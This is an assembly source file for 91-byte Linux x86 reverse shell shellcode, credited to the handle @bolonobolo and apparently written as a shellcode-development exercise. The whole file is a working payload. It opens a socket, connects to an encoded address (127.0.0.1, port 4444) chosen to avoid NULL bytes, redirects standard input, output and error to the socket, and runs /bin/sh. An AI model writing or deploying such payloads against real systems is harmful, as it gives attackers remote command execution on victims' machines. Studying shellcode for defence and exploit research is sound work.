; Filename: reverse_shell.nasm - 91 bytes
; Date: 16th October 2019
; Author:  @bolonobolo
; Web:  https://blackcloud.me
; Tested on: Linux x86

global _start			

section .text
_start:


	;socket()
	xor ecx, ecx        ; xoring ECX
	xor ebx, ebx        ; xoring EBX
	mul ebx             ; xoring EAX and EDX
	inc cl              ; ECX should be 1
	inc bl
	inc bl              ; EBX should be 2
	mov ax, 0x167       ; 
	int 0x80            ; call socket()

	;connect()          ; move the return value of socket
	xchg ebx, eax       ; from EAX to EBX ready for the next syscalls

	; push sockaddr structure in the stack
	dec cl
	push ecx                ; unused char (0)

	; move the lenght (16 bytes) of IP in EDX
	mov dl, 0x16

	; the ip address 1.0.0.127 could be 4.3.3.130 to avoid NULL bytes
	mov ecx, 0x04030382              ; mov ip in ecx
	sub ecx, 0x03030303              ; subtract 3.3.3.3 from ip
	push ecx                         ; load the real ip in the stack
	push word 0x5c11                 ; port 4444
	push word 0x02                   ; AF_INET family
	lea ecx, [esp]
	                                 ; EBX still contain the value of the opened socket
	mov ax, 0x16a
	int 0x80

	; dup2()
	    xor ecx, ecx
	    mov cl, 0x3

	dup2:
	    xor eax, eax
	                                 ; EBX still contain the value of the opened socket
	    mov al, 0x3f
	    dec cl
	    int 0x80
	    jnz dup2

	; execve() from the previous polymorphic analysis 25 bytes
	cdq                     ; xor edx
	mul edx                 ; xor eax
	lea ecx, [eax]          ; xor ecx
	mov esi, 0x68732f2f
	mov edi, 0x6e69622f
	push ecx                ; push NULL in stack
	push esi                ; push hs/ in stack
	push edi                ; push nib// in stack
	lea ebx, [esp]          ; load stack pointer to ebx
	mov al, 0xb             ; load execve in eax
	int 0x80
